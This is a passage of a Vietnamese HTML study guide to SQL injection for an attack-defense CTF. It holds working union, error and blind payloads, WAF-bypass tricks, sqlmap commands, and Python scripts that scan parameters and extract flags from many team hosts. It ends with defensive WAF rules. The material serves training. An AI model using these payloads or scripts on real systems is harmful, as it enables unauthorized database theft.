+    <tr><td>6. Liệt kê cột của 1 bảng</td><td><code>' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flags'-- -</code></td><td>Biết tên bảng rồi, giờ xem nó có cột gì</td></tr>
+  </table>
+
+  <h3>B. Error-based <span class="badge med">khi muốn ép lỗi hiển thị dữ liệu</span></h3>
+  <p>Dùng khi: trang <strong>không hiện kết quả SELECT</strong> trực tiếp, nhưng <strong>có hiện thông báo lỗi
+  chi tiết</strong> của database (MySQL hay bị vậy).</p>
+  <pre><code>' AND extractvalue(1, concat(0x7e, (SELECT flag FROM flags LIMIT 1)))-- -</code></pre>
+  <div class="pbreak"><div class="pb">
+    <div class="part"><code>extractvalue(1, chuỗi)</code> — một hàm MySQL dùng để xử lý XML, nhưng nếu
+    <code>chuỗi</code> không phải XML hợp lệ, MySQL sẽ <strong>ném lỗi và in luôn chuỗi đó ra thông báo lỗi</strong>
+    — ta lợi dụng để "ép" database tự in flag ra ngoài qua message lỗi.</div>
+    <div class="part"><code>concat(0x7e, ...)</code> — nối thêm ký tự <code>~</code> (mã hex <code>0x7e</code>)
+    vào đầu, chỉ để dễ nhận ra điểm bắt đầu dữ liệu trong thông báo lỗi.</div>
+  </div></div>
+
+  <h3>C. Boolean-based Blind <span class="badge med">khi không có union, không có error hiện ra</span></h3>
+  <p>Dùng khi: trang <strong>trông giống hệt nhau</strong> dù query đúng hay sai, <strong>trừ một chi tiết nhỏ</strong>
+  (có/không có 1 dòng chữ, redirect khác, độ dài trang khác vài ký tự).</p>
+  <pre><code><span class="c"># Xác nhận blind hoạt động</span>
+' AND 1=1-- -      <span class="c"># true -> trang như bình thường</span>
+' AND 1=2-- -      <span class="c"># false -> trang khác đi (thiếu 1 phần, trống...)</span>
+
+<span class="c"># Suy ra từng ký tự của flag (đoán nhị phân)</span>
+' AND SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='F'-- -</code></pre>
+  <div class="note">Nguyên lý: thử lần lượt từng ký tự có thể có (a-z, 0-9...) ở từng vị trí trong chuỗi flag. Vị trí
+  nào server trả "true" (trang như bình thường) → đúng ký tự đó. Lặp lại cho tới hết độ dài flag. Việc này <strong>
+  bắt buộc phải tự động hóa bằng script</strong> (xem mục 07) vì phải thử hàng trăm lần.</div>
+
+  <h3>D. Time-based Blind <span class="badge hard">khi response không khác gì cả</span></h3>
+  <p>Dùng khi: ngay cả boolean-blind cũng không phân biệt được response (ví dụ server luôn trả về y hệt một trang
+  "cảm ơn"). Lúc đó dùng <strong>thời gian phản hồi</strong> làm tín hiệu true/false.</p>
+  <table>
+    <tr><th>DB</th><th>Payload mẫu</th></tr>
+    <tr><td>MySQL</td><td><code>' AND IF(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='F',SLEEP(3),0)-- -</code></td></tr>
+    <tr><td>PostgreSQL</td><td><code>'; SELECT CASE WHEN SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='F' THEN pg_sleep(3) ELSE pg_sleep(0) END--</code></td></tr>
+    <tr><td>SQLite</td><td>không có <code>SLEEP</code> trực tiếp — thường khai thác qua truy vấn tốn CPU lặp (hiếm gặp trong CTF, ưu tiên union/error trước)</td></tr>
+  </table>
+
+  <h3>Khác biệt cú pháp giữa các DB (tra nhanh)</h3>
+  <table>
+    <tr><th>Việc cần làm</th><th>MySQL</th><th>PostgreSQL</th><th>SQLite</th></tr>
+    <tr><td>Comment hết dòng</td><td><code>-- -</code> hoặc <code>#</code></td><td><code>--</code></td><td><code>--</code></td></tr>
+    <tr><td>Lấy version</td><td><code>@@version</code></td><td><code>version()</code></td><td><code>sqlite_version()</code></td></tr>
+    <tr><td>Nối chuỗi</td><td><code>CONCAT(a,b)</code></td><td><code>a || b</code></td><td><code>a || b</code></td></tr>
+    <tr><td>Time delay</td><td><code>SLEEP(3)</code></td><td><code>pg_sleep(3)</code></td><td>không có sẵn</td></tr>
+    <tr><td>Bảng hệ thống liệt kê bảng</td><td><code>information_schema.tables</code></td><td><code>information_schema.tables</code></td><td><code>sqlite_master</code></td></tr>
+  </table>
+
+  <h3>Vượt bộ lọc cơ bản (khi payload chuẩn bị bị chặn)</h3>
+  <table>
+    <tr><th>Bộ lọc gặp phải</th><th>Cách né</th></tr>
+    <tr><td>Chặn khoảng trắng</td><td>Dùng comment thay space: <code>UNION/**/SELECT</code>, hoặc dùng xuống dòng <code>%0a</code></td></tr>
+    <tr><td>Chặn chữ <code>UNION SELECT</code> (viết hoa/thường)</td><td>Đổi hoa-thường trộn: <code>UnIoN SeLeCt</code> (SQL không phân biệt hoa thường)</td></tr>
+    <tr><td>Chặn dấu nháy đơn <code>'</code></td><td>Dùng mã hex thay chuỗi: <code>0x666c6167</code> thay cho <code>'flag'</code></td></tr>
+    <tr><td>Chặn từ khóa <code>OR</code></td><td>Dùng toán tử tương đương: <code>||</code> (một số DB hiểu là OR logic trong điều kiện boolean)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: SQLMAP &amp; KHO PAYLOAD</div>
+  <h2>Không nhớ nổi payload? Đừng cố nhớ — tra và tự động hóa</h2>
+  <p class="lead">Không ai nhớ hết payload cho mọi DB/tình huống, và cũng không cần phải nhớ. Khi vào phòng thi
+  (không có Internet), bạn có 2 vũ khí offline: một <strong>kho payload để tra</strong> khi bí, và một
+  <strong>công cụ tự động khai thác</strong> làm phần nặng thay bạn. Dùng đúng thứ tự: <strong>sqlmap trước</strong>
+  để tìm nhanh + xác nhận injection, kho payload chỉ để tra khi sqlmap không đủ hoặc bạn cần hiểu nó đang làm gì.</p>
+
+  <h3>A. Kho payload offline — PayloadsAllTheThings</h3>
+  <div class="def"><b>PayloadsAllTheThings</b> — một kho (repo) chứa sẵn payload mẫu cho hầu hết mọi loại lỗ hổng
+  web, chia theo từng chủ đề. Đây <strong>không phải công cụ tự chạy</strong>, chỉ là "cuốn từ điển" để bạn mở ra
+  tra khi bí ý tưởng — giống việc tra từ điển khi quên một từ tiếng Anh.</div>
+  <p>Đã có sẵn trên máy ở: <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/SQL Injection/</code> — mang nguyên laptop này
+  (hoặc copy thư mục này) vào phòng thi là dùng được, không cần mạng.</p>
+  <table>
+    <tr><th>File</th><th>Khi nào mở</th></tr>
+    <tr><td><code>MySQL Injection.md</code>, <code>PostgreSQL Injection.md</code>, <code>SQLite Injection.md</code>, <code>MSSQL Injection.md</code>, <code>OracleSQL Injection.md</code></td><td>Khi đã biết DB challenge dùng (xem mục 04/06), cần payload đặc thù DB đó (hàm lấy version, enumerate table...)</td></tr>
+    <tr><td><code>SQLmap.md</code></td><td>Tra nhanh cú pháp sqlmap khi quên flag nào dùng cho việc gì</td></tr>
+    <tr><td><code>Intruder/</code></td><td>Các file <code>.txt</code> là wordlist nạp thẳng vào Burp Intruder (mục 05) thay vì tự nghĩ danh sách payload để fuzz</td></tr>
+  </table>
+  <div class="note burp"><span class="tag">Tra nhanh trong lúc thi (không cần mở trình duyệt)</span>
+  Mở terminal, <code>cd</code> vào thư mục đó rồi <code>grep</code> thẳng từ khóa cần — nhanh hơn nhiều so với kéo
+  chuột tìm trong file dài:
+<pre><code>cd ~/hoc/CTF/Tools/web/PayloadsAllTheThings/<span class="s">"SQL Injection"</span>
+grep -A3 -i <span class="s">"union"</span> <span class="s">"PostgreSQL Injection.md"</span>
+grep -A3 -i <span class="s">"time"</span>  <span class="s">"MySQL Injection.md"</span></code></pre></div>
+
+  <h3>B. sqlmap — tự động dò và khai thác</h3>
+  <div class="def"><b>sqlmap</b> — công cụ dòng lệnh tự động: bạn đưa nó 1 request, nó tự thử hàng trăm payload
+  (union/error/blind/time) trên mọi tham số, tự nhận diện DB, rồi tự liệt kê database/bảng/cột/dữ liệu — việc mà
+  làm tay ở mục 06-07 cũ sẽ rất lâu. Đã cài sẵn trên máy, gõ <code>sqlmap --version</code> để kiểm tra.</div>
+
+  <div class="note burp"><span class="tag">Bước 1 — lấy request đã bắt từ Burp</span>
+  Trong Burp (đã bắt request ở mục 05), chuột phải request trong tab <strong>Proxy</strong> hoặc
+  <strong>Repeater</strong> → <strong>Save item</strong> → lưu thành file, ví dụ <code>req.txt</code>. File này chứa
+  nguyên văn request (method, URL, header, body) — sqlmap đọc trực tiếp được, không cần gõ lại URL/tham số bằng tay.</div>
+
+  <div class="note burp"><span class="tag">Bước 2 — chạy sqlmap với request file</span>
+<pre><code><span class="c"># Dò + xác nhận có injection không, liệt kê database</span>
+sqlmap -r req.txt --batch --dbs
+
+<span class="c"># Đã biết tên database (vd "ctf"), liệt kê bảng</span>
+sqlmap -r req.txt --batch -D ctf --tables
+
+<span class="c"># Liệt kê cột của bảng "flags"</span>
+sqlmap -r req.txt --batch -D ctf -T flags --columns
+
+<span class="c"># Dump thẳng cột "flag" (nhanh hơn dump cả bảng)</span>
+sqlmap -r req.txt --batch -D ctf -T flags -C flag --dump</code></pre>
+  </div>
+  <table>
+    <tr><th>Flag</th><th>Ý nghĩa</th></tr>
+    <tr><td><code>-r req.txt</code></td><td>Đọc toàn bộ request từ file (thay vì phải gõ <code>-u URL --data ...</code> tay)</td></tr>
+    <tr><td><code>--batch</code></td><td><strong>Luôn thêm flag này</strong> khi tự động hóa — sqlmap tự trả lời "có" mọi câu hỏi tương tác, không đứng lại chờ bạn gõ Enter</td></tr>
+    <tr><td><code>-p THAM_SO</code></td><td>Chỉ định đúng tham số nghi ngờ (dùng khi request có nhiều tham số, sqlmap tự dò nhầm chỗ khác)</td></tr>
+    <tr><td><code>--dbms=mysql</code></td><td>Ép sqlmap chỉ thử cú pháp MySQL (biết trước DB ở mục 04/06) → nhanh hơn hẳn vì bỏ qua dò các DB khác</td></tr>
+    <tr><td><code>--technique=U</code></td><td>Ép chỉ dùng kỹ thuật Union (U=union, B=boolean, E=error, T=time) — nhanh hơn khi đã biết loại nào ăn</td></tr>
+    <tr><td><code>--level=3 --risk=2</code></td><td>Tăng độ sâu thử (mặc định 1/1) khi payload mặc định không phát hiện ra injection</td></tr>
+    <tr><td><code>--proxy=http://127.0.0.1:8080</code></td><td>Cho sqlmap gửi request qua Burp — để bạn <em>nhìn thấy</em> từng request nó gửi, học được payload nó dùng</td></tr>
+  </table>
+
+  <div class="note warn"><span class="tag">Khi WAF chặn sqlmap</span>
+  Dùng tamper script để biến đổi payload né filter (xem danh sách đầy đủ: <code>sqlmap --list-tampers</code>):
+<pre><code><span class="c"># vd: khoảng trắng bị chặn -> đổi thành comment /**/</span>
+sqlmap -r req.txt --batch --tamper=space2comment
+
+<span class="c"># vd: chữ hoa/thường bị chặn theo pattern cố định -> trộn ngẫu nhiên</span>
+sqlmap -r req.txt --batch --tamper=randomcase,space2comment</code></pre>
+  </div>
+
+  <div class="note tip"><span class="tag">Giới hạn của sqlmap trong Attack-Defense — vì sao vẫn cần script riêng</span>
+  sqlmap rất mạnh nhưng <strong>chậm</strong> (thử nhiều kỹ thuật, nhiều request mỗi lần chạy) — không hợp để lặp
+  qua 10-20 đội mỗi round chỉ trong vài phút. Workflow đúng cho A/D:
+  <ol style="margin:4px 0 0">
+    <li>Dùng sqlmap <strong>1 lần</strong> trên service của chính đội bạn (round đầu, hoặc lúc rảnh) để xác nhận
+    có injection + tìm ra tên bảng/cột chứa flag.</li>
+    <li>Copy đúng payload sqlmap đã xác nhận ăn (xem nó in ra trong log, hoặc tự ráp lại dựa trên tên
+    bảng/cột đã tìm được) vào <strong>script Python nhẹ</strong> ở mục 08 — chạy nhanh, lặp hết các đội mỗi round.</li>
+  </ol></div>
+
+  <h3>C. Không có/không muốn dùng sqlmap? Script tự quét nhẹ</h3>
+  <p>Nếu sqlmap bị cấm mang vào, bị lỗi, hoặc bạn muốn kiểm soát hoàn toàn, dùng script tự dò đơn giản sau — kém
+  mạnh hơn sqlmap rất nhiều (không tự tìm tên bảng/cột, không có tamper) nhưng đủ để <strong>xác nhận nhanh</strong>
+  tham số nào dính injection trước khi tự ráp payload bằng tay (mục 06):</p>
+  <pre><code><span class="k">import</span> requests, time
+
+<span class="k">def</span> <span class="d">auto_scan_param</span>(url, param, baseline_value=<span class="s">"1"</span>):
+    <span class="c">"""Thử nhanh error-based + boolean-blind + time-blind trên 1 tham số."""</span>
+    base = requests.get(url, params={param: baseline_value}, timeout=5)
+
+    <span class="c"># 1) Error-based: gõ dấu nháy, xem status/độ dài đổi khác hẳn</span>
+    r = requests.get(url, params={param: baseline_value + <span class="s">"'"</span>}, timeout=5)
+    <span class="k">if</span> r.status_code != base.status_code <span class="k">or</span> abs(len(r.text) - len(base.text)) > 50:
+        <span class="k">print</span>(<span class="s">f"[{param}] nghi ERROR-BASED (status {base.status_code}->{r.status_code})"</span>)
+
+    <span class="c"># 2) Boolean-blind: so sánh true vs false</span>
+    t = requests.get(url, params={param: <span class="s">f"{baseline_value}' AND 1=1-- -"</span>}, timeout=5)
+    f = requests.get(url, params={param: <span class="s">f"{baseline_value}' AND 1=2-- -"</span>}, timeout=5)
+    <span class="k">if</span> len(t.text) != len(f.text):
+        <span class="k">print</span>(<span class="s">f"[{param}] nghi BOOLEAN-BLIND (len true={len(t.text)}, false={len(f.text)})"</span>)
+
+    <span class="c"># 3) Time-blind: đo thời gian phản hồi khi có/không SLEEP</span>
+    t0 = time.time()
+    requests.get(url, params={param: <span class="s">f"{baseline_value}' AND SLEEP(3)-- -"</span>}, timeout=8)
+    elapsed = time.time() - t0
+    <span class="k">if</span> elapsed > 2.5:
+        <span class="k">print</span>(<span class="s">f"[{param}] nghi TIME-BLIND (mất {elapsed:.1f}s)"</span>)
+
+auto_scan_param(<span class="s">"http://TARGET/item"</span>, <span class="s">"id"</span>)</code></pre>
+  <div class="note"><span class="tag">Mức tự động của script này — đọc kỹ để khỏi nhầm</span>
+  <strong>Đầu vào bạn đưa:</strong> chỉ URL + tên tham số (vd <code>"id"</code>) — <strong>không cần biết payload
+  trước</strong>, 3 payload test (dấu nháy, <code>AND 1=1</code>/<code>1=2</code>, <code>SLEEP(3)</code>) đã viết
+  sẵn trong hàm. <strong>Đầu ra:</strong> chỉ in dòng "nghi X" — nó <strong>không tự tìm ra flag</strong>, vì
+  muốn lấy flag thật phải biết tên bảng/cột chứa flag, mà script này không tự dò ra được tên đó.<br>
+  → Dùng xong script này (biết "có SQLi, loại gì") thì <strong>vẫn phải</strong> qua sqlmap hoặc tay (mục 06) để
+  tìm tên bảng/cột, rồi mới viết được payload thật để đưa vào script mục 08 bên dưới — <strong>mục 08 thì ngược
+  lại: bạn phải tự gõ payload đã biết vào, nó không tự scan gì cả</strong>, chỉ lo lặp nhanh qua nhiều đội và
+  trích flag bằng regex.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/item"</span>
+
+<span class="c"># Bước 1: xác nhận có SQLi</span>
+r = requests.get(url, params={<span class="s">"id"</span>: <span class="s">"1'"</span>})
+<span class="k">print</span>(<span class="s">"Bước 1 (gây lỗi):"</span>, r.status_code)   <span class="c"># mong đợi 500 hoặc trang lỗi</span>
+
+<span class="c"># Bước 2: đếm cột bằng vòng lặp thay vì gõ tay từng số</span>
+<span class="k">for</span> n <span class="k">in</span> range(1, 10):
+    r = requests.get(url, params={<span class="s">"id"</span>: <span class="s">f"1' ORDER BY {n}-- -"</span>})
+    <span class="k">if</span> <span class="s">"error"</span> <span class="k">in</span> r.text.lower() <span class="k">or</span> r.status_code == 500:
+        <span class="k">print</span>(<span class="s">f"Số cột = {n - 1}"</span>)
+        <span class="k">break</span>
+
+<span class="c"># Bước 3: union lấy flag (giả sử 3 cột, cột 2 hiện ra)</span>
+r = requests.get(url, params={<span class="s">"id"</span>: <span class="s">"0 UNION SELECT 1,flag,3 FROM flags-- -"</span>})
+<span class="k">print</span>(<span class="s">"Response:"</span>, r.text[:500])  <span class="c"># tự mắt nhìn flag trong đây</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">exploit_sqli</span>(host):
+    url = <span class="s">f"http://{host}/item"</span>
+    r = requests.get(url, params={<span class="s">"id"</span>: <span class="s">"0 UNION SELECT 1,flag,3 FROM flags-- -"</span>}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+flag = exploit_sqli(<span class="s">"TARGET_IP"</span>)
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, flag)</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests, sys
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOAD = <span class="s">"0 UNION SELECT 1,flag,3 FROM flags-- -"</span>
+
+<span class="k">def</span> <span class="d">exploit_sqli</span>(host):
+    <span class="k">try</span>:
+        r = requests.get(<span class="s">f"http://{host}/item"</span>, params={<span class="s">"id"</span>: PAYLOAD}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>   <span class="c"># service đội đó có thể đang down/reset round -> bỏ qua, không crash</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="c"># teams.txt: mỗi dòng 1 IP đội, lấy từ BTC</span>
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_sqli(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+  <div class="note tip"><span class="tag">Bắt buộc với A/D</span>Có <code>timeout</code>, bắt lỗi mạng (service đội
+  khác có thể đang bị đội khác tấn công/đang reset), ghi flag ra file để script nộp flag (riêng, có throttle
+  ≤30 lần/phút) đọc lại — không gộp 2 việc khai thác và nộp flag vào 1 script.</div>
+
+  <h3>Script blind SQLi (đoán từng ký tự) — khi không dùng được union</h3>
+  <pre><code><span class="k">import</span> requests, string
+
+<span class="k">def</span> <span class="d">is_true</span>(host, condition):
+    r = requests.get(<span class="s">f"http://{host}/item"</span>,
+            params={<span class="s">"id"</span>: <span class="s">f"1' AND {condition}-- -"</span>}, timeout=5)
+    <span class="k">return</span> <span class="s">"Price"</span> <span class="k">in</span> r.text   <span class="c"># chữ chỉ xuất hiện khi điều kiện true, thay theo challenge thật</span>
+
+<span class="k">def</span> <span class="d">extract_flag</span>(host, max_len=70):
+    flag = <span class="s">""</span>
+    charset = string.ascii_letters + string.digits + <span class="s">"{}_-"</span>
+    <span class="k">for</span> pos <span class="k">in</span> range(1, max_len + 1):
+        <span class="k">for</span> ch <span class="k">in</span> charset:
+            cond = <span class="s">f"SUBSTRING((SELECT flag FROM flags LIMIT 1),{pos},1)='{ch}'"</span>
+            <span class="k">if</span> is_true(host, cond):
+                flag += ch
+                <span class="k">print</span>(flag, end=<span class="s">"\r"</span>)
+                <span class="k">break</span>
+        <span class="k">else</span>:
+            <span class="k">break</span>   <span class="c"># không ký tự nào khớp -> đã hết flag</span>
+    <span class="k">return</span> flag
+
+<span class="k">print</span>(extract_flag(<span class="s">"TARGET_IP"</span>))</code></pre>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <p>Giả sử bạn nhận một service web, trang chủ có ô tìm kiếm sản phẩm theo tên, URL dạng
+  <code>/search?q=laptop</code>.</p>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Xem HTML: có form tìm kiếm GET, param tên <code>q</code>. Thử gõ chữ thường, trang hiện danh sách sản phẩm khớp tên.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Nhận diện</div><div class="d">Burp bắt request <code>GET /search?q=laptop</code>, Send to Repeater, sửa <code>q=laptop'</code> → Response: status 500, body chứa <code>"You have an error in your SQL syntax"</code> ⟹ xác nhận SQLi, và lộ luôn đây là MySQL.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Đếm cột</div><div class="d">Sửa thành <code>q=laptop' ORDER BY 1-- -</code>, tăng dần. Tới <code>ORDER BY 3</code> vẫn OK, <code>ORDER BY 4</code> lỗi ⟹ 3 cột.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Tìm cột hiện ra</div><div class="d"><code>q=nope' UNION SELECT 1,2,3-- -</code> (chữ "nope" để query gốc không trả dòng thật nào, dễ nhìn). Trang hiện ra số <code>2</code> ở vị trí tên sản phẩm ⟹ cột 2 là cột hiển thị.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d"><code>q=nope' UNION SELECT 1,flag,3 FROM flags-- -</code> → Response hiện dòng sản phẩm giả với "tên sản phẩm" chính là <code>FHACKER2026{64 ký tự hex}</code>.</div></div></div>
+    <div class="srow"><span class="n">6</span><div><div class="t">Tự động hóa</div><div class="d">Dán payload đã xác nhận vào bản script (C) ở mục 07, chạy qua danh sách IP các đội, ghi flag ra file.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex)</th><th>Khớp gì</th></tr>
+    <tr><td><code>(?i)union\s+select</code></td><td>Mọi biến thể hoa/thường của <code>UNION SELECT</code>, kể cả có nhiều khoảng trắng</td></tr>
+    <tr><td><code>(?i)'\s*(or|and)\s+'?\d</code></td><td><code>' OR 1</code>, <code>' AND 1</code>... (bắt đầu phá điều kiện WHERE)</td></tr>
+    <tr><td><code>(?i)sleep\s*\(|pg_sleep\s*\(|benchmark\s*\(</code></td><td>Time-based blind payload</td></tr>
+    <tr><td><code>information_schema</code></td><td>Dò cấu trúc database (bảng/cột)</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm (quy chế A/D)</span>
+  <strong>Không</strong> chặn mọi dấu <code>'</code> (sẽ chặn luôn tên như <code>O'Brien</code> hợp lệ). <strong>Không
+  </strong> viết rule quá rộng kiểu <code>.*select.*</code> (chặn cả request bình thường có chữ "select" trong tên
+  sản phẩm). Luôn bật <strong>DetectionOnly</strong> trước, xem log traffic thật, chắc chắn không bắt nhầm request
+  hợp lệ rồi mới chuyển sang chế độ chặn thật (block).</div>
+  <div class="note tip"><span class="tag">Mẹo</span>Rule theo payload cụ thể vừa khai thác được (như
+  <code>union\s+select</code>) luôn an toàn hơn rule "đoán trước" chung chung — vì bạn đã biết chính xác payload nào
+  mình/đối thủ cần dùng.</div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Lỗi "different number of columns"</td><td>Đếm sai số cột</td><td>Thử lại <code>ORDER BY</code> tăng dần cẩn thận từng số 1</td></tr>
+    <tr><td>UNION chạy nhưng không thấy gì mới</td><td>Điều kiện WHERE gốc vẫn khớp, lẫn với dữ liệu thật</td><td>Đổi điều kiện gốc thành chắc chắn sai (vd <code>id=-1</code> hoặc <code>q=khongcoten</code>)</td></tr>
+    <tr><td>Comment <code>-- -</code> không nuốt được phần sau</td><td>Một số framework coi dấu cách sau <code>--</code> là bắt buộc, hoặc filter chặn <code>--</code></td><td>Thử <code>-- -</code> (có khoảng trắng + ký tự thừa), hoặc <code>#</code> (MySQL), hoặc đóng ngoặc tay nếu truy vấn gốc có dấu ngoặc</td></tr>
+    <tr><td>Response 200 nhưng không có flag</td><td>Tên bảng/cột đoán sai</td><td>Dùng payload liệt kê bảng/cột ở mục 06.A bước 5-6 trước khi đoán mò tên</td></tr>
+    <tr><td>Blind không phân biệt được true/false</td><td>Điều kiện kiểm tra (<code>"Price" in r.text</code>) chưa đúng đặc điểm riêng của trang</td><td>So sánh thủ công 2 response (điều kiện chắc true vs chắc false) trong Burp, tìm đúng điểm khác biệt (độ dài, 1 chữ cụ thể, status code)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Tham số đi thẳng vào câu SQL bằng nối chuỗi (f-string, <code>+</code>, <code>%</code> format) — đa số challenge CTF cố ý viết kiểu này.</td></tr>
+    <tr><td>✅</td><td>App dùng ORM nhưng vẫn có chỗ gọi raw SQL (<code>.raw()</code>, <code>execute()</code> thủ công) kèm nối chuỗi.</td></tr>
+    <tr><td>❌</td><td>App dùng <strong>prepared statement / parameterized query</strong> đúng cách (tham số truyền qua <code>?</code> hoặc <code>%s</code> riêng biệt, không nối chuỗi) — đây là cách vá chuẩn, SQLi không khai thác được nữa.</td></tr>
+    <tr><td>❌</td><td>Input được ép kiểu số nghiêm ngặt trước khi vào query (ví dụ <code>int(request.args.get("id"))</code> ở Python) — không còn chỗ nhét ký tự <code>'</code>.</td></tr>
+  </table>
+  <div class="note">Nếu SQLi không ăn, kiểm tra xem challenge có đang dùng ORM (SQLAlchemy, Django ORM...) đúng cách
+  không — lúc đó nên chuyển hướng tìm lỗ hổng khác (IDOR, SSTI...) thay vì cố khai thác SQLi.</div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng lại ví dụ mục 08 bằng tay trên Burp, từ bước recon tới khi thấy flag trong
+  Response.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ đổi điều kiện gốc thành chắc chắn sai trước khi UNION, nếu không 2 bộ
+  dữ liệu sẽ lẫn vào nhau khó đọc.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> giả sử challenge không hiện UNION ra màn hình (chỉ có "Tìm thấy" / "Không tìm
+  thấy"), hãy viết script boolean-blind trích flag bằng mục 07.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Tìm đúng chuỗi phân biệt true/false bằng Burp trước (so sánh 2 response
+  của <code>1=1</code> và <code>1=2</code>) rồi mới đưa vào script.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> challenge dùng PostgreSQL, lọc chặn chữ <code>UNION</code> (không phân biệt
+  hoa thường) và khoảng trắng kép. Viết payload union-based vượt qua bộ lọc này.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Kết hợp: đổi hoa-thường (<code>UnIoN</code>) + dùng comment
+  <code>/**/</code> thay khoảng trắng.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td><code>SELECT</code></td><td>Câu lệnh SQL để "lấy dữ liệu ra" từ bảng.</td></tr>
+    <tr><td><code>UNION</code></td><td>Ghép kết quả của 2 câu <code>SELECT</code> làm một, yêu cầu số cột khớp nhau.</td></tr>
+    <tr><td>Blind SQLi</td><td>Dạng SQLi không thấy dữ liệu hiện trực tiếp, phải suy luận qua true/false hoặc thời gian phản hồi.</td></tr>
+    <tr><td>Payload</td><td>Chuỗi ký tự bạn cố tình gửi để gây ra hành vi khai thác (ở đây là 1 đoạn SQL chèn vào).</td></tr>
+    <tr><td>WAF</td><td>Web Application Firewall — lớp lọc request trước khi tới app, dùng rule để chặn payload độc hại.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Đọc thêm (offline):</strong> PayloadsAllTheThings/SQL Injection,
+  HackTricks/pentesting-web/sql-injection, SecLists (fuzz list cho SQLi), OWASP SQL Injection Prevention Cheat
+  Sheet.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("sqli-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("sqli-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
